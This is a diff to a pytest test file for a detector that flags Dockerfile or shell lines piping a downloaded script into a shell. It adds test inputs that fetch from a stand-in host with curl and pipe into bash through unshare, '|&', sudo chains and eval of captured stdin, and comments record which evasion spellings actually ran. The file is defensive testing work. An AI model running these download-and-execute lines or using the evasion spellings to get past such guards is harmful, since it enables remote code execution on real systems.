@@ -269,6 +269,37 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
             "RUN curl -sSL https://x.example/i.sh | nice -n 5 sudo -s\n",
             id="nice-operand-then-sudo",
         ),
+        # `unshare` runs its program with namespaces unshared and stdin untouched. Confirmed:
+        #   sudo -n unshare bash < payload       ->  ran
+        #   sudo -n unshare --fork sh < payload  ->  ran
+        pytest.param("RUN curl -sSL https://x.example/i.sh | unshare bash\n", id="unshare-wrapper"),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | unshare --fork sh\n", id="unshare-fork"
+        ),
+        # Only a few unshare flags take a SEPARATE operand; the namespace ones fuse (`--mount=f`).
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | unshare -S 0 bash\n", id="unshare-setuid"
+        ),
+        # `|&` is ONE operator (pipe stdout AND stderr). Tokenized as `|` then `&`, the `&` ended
+        # the pipeline before the shell and the line read as clean:
+        #   cat payload |& bash  ->  ran
+        pytest.param("RUN curl -sSL https://x.example/i.sh |& bash\n", id="pipe-both-streams"),
+        # `eval` is a builtin, so the `-c` recursion stops at it -- but a capture of stdin is the
+        # download, and eval executes it. Each spelling confirmed:
+        #   printf 'echo PWNED\n' | bash -c 'eval "$(cat)"'          ->  PWNED
+        #   printf 'echo PWNED\n' | bash -c 'eval "$(</dev/stdin)"'  ->  PWNED
+        #   printf 'echo PWNED\n' | bash -c 'eval "`cat`"'           ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | bash -c 'eval \"$(cat)\"'\n", id="eval-cat"
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | bash -c 'eval \"$(</dev/stdin)\"'\n",
+            id="eval-redirect-stdin",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | bash -c 'eval \"`cat`\"'\n",
+            id="eval-backtick-cat",
+        ),
         # Privilege tools CHAIN, and the last one decides. `sudo su` is the ordinary spelling;
         # stopping at `sudo` reads `su` as a command that replaces the shell, while it starts one:
         #   printf 'echo PWNED\n' | sudo -n su           ->  PWNED
@@ -567,6 +598,19 @@ def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp
         # `-s`/`-i` start a shell only when NOTHING follows them. With a command present, sudo
         # runs THAT and the stream is never executed -- so the flag alone cannot be the signal.
         # Confirmed: printf 'echo X\n' | sudo -n -s echo hi   ->   hi
+        # The fetch name must be the stage's COMMAND. Matching it in any token made a search
+        # PATTERN a download, and the shell downstream receives locally selected text:
+        #   grep echo commands.txt | bash  ->  runs the local file's line, fetches nothing
+        pytest.param("grep curl commands.txt | bash", id="fetch-name-is-a-pattern"),
+        pytest.param("grep -r wget src | bash", id="fetch-name-is-a-pattern-with-flags"),
+        # `eval` only matters when the capture reads STDIN. A literal or a variable does not.
+        pytest.param("curl -s https://x.example/f | bash -c 'eval \"$FOO\"'", id="eval-a-variable"),
+        pytest.param(
+            "curl -s https://x.example/f | bash -c 'eval \"echo SAFE\"'", id="eval-a-literal"
+        ),
+        # The new wrapper and operator must not make ordinary destinations match.
+        pytest.param("curl -s https://x.example/f | unshare jq .", id="unshare-into-jq"),
+        pytest.param("curl -s https://x.example/f |& jq .", id="pipe-both-streams-into-jq"),
         # A chained tool still honours the LAST tool's own selection and `-c`, so the safe
         # spellings stay safe through the chain.
         pytest.param(
